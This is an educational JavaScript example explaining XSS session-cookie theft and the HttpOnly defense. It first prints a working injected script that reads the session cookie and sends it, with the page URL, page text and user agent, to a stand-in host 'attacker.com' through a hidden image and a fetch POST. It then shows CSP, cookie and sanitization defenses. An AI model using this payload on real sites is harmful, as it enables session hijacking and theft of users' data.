// Example: XSS attack stealing session cookie
// This demonstrates how vulnerable applications can leak session IDs
// Educational purpose - shows why HttpOnly flag is critical

// VULNERABLE APPLICATION CODE (missing HttpOnly flag)
// Server sets cookie without HttpOnly protection:
// Set-Cookie: session=abc123xyz789; Secure; SameSite=Strict

// ATTACKER'S MALICIOUS SCRIPT injected via XSS vulnerability
// This script runs in victim's browser with full access to cookies

(function() {
    // Access all cookies accessible to JavaScript
    var allCookies = document.cookie;

    // Extract session ID from cookies
    var sessionMatch = allCookies.match(/session=([^;]+)/);

    if (sessionMatch && sessionMatch[1]) {
        var sessionId = sessionMatch[1];

        // Send stolen session ID to attacker's server
        var attackerServer = 'https://attacker.com/collect';

        // Create hidden image to send data without user seeing anything
        var img = document.createElement('img');
        img.src = attackerServer + '?session=' + sessionId + 
                  '&url=' + encodeURIComponent(window.location.href) +
                  '&user=' + encodeURIComponent(document.body.innerText.substring(0, 50));
        img.style.display = 'none';
        document.body.appendChild(img);

        // Alternatively, use fetch API for more sophisticated exfiltration
        fetch(attackerServer, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                sessionId: sessionId,
                targetUrl: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            }),
            mode: 'no-cors'  // Bypass CORS restrictions
        });
    }
})();

// SECURE APPLICATION CODE (with HttpOnly flag)
// Server sets cookie with HttpOnly protection:
// Set-Cookie: session=abc123xyz789; HttpOnly; Secure; SameSite=Strict
//
// With HttpOnly flag set:
// - document.cookie will NOT include this cookie
// - JavaScript cannot access the session ID
// - Cookie is only sent with HTTP requests, not accessible to scripts
// - XSS attacks cannot steal the session ID through JavaScript

// DEFENSE IN DEPTH: Additional protections
// 1. Content Security Policy (CSP)
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; object-src 'none'"
    );
    next();
});

// 2. Set secure cookie options
app.use(session({
    secret: 'cryptographically-random-secret-key',
    name: 'sessionId',  // Use non-obvious cookie name
    cookie: {
        httpOnly: true,      // Prevent JavaScript access
        secure: true,        // Only send over HTTPS
        sameSite: 'strict',  // Prevent CSRF
        maxAge: 3600000      // 1 hour expiration
    },
    resave: false,
    saveUninitialized: false
}));

// 3. Input sanitization to prevent XSS
const validator = require('validator');

function sanitizeInput(userInput) {
    // Escape HTML special characters
    return validator.escape(userInput);
}

// 4. Session binding to IP and User-Agent (with caution)
function validateSessionBinding(req, session) {
    if (session.ipAddress !== req.ip) {
        // IP changed - potential hijacking
        return false;
    }
    if (session.userAgent !== req.headers['user-agent']) {
        // User agent changed - potential hijacking
        return false;
    }
    return true;
}
